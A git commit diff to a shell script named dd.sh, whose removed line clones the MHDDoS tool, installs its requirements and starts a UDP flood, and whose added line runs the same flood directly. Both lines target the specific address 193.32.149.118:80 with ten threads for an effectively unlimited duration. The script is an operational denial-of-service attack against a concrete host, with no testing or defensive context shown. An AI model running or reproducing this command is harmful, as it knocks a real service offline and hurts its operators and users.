c58f7ac4659c4d739310e7954272b9b1008ab9cf
rxyxxy <80524108+rxyxxy@users.noreply.github.com>
2024-07-18 19:26:54 +0800

    Update dd.sh

--- dd.sh
+++ dd.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-git clone https://github.com/MatrixTM/MHDDoS.git && cd MH* && pip3 install -r requirements.txt && python3 start.py UDP 193.32.149.118:80 10 99999999 true
+python3 start.py UDP 193.32.149.118:80 10 99999999 true
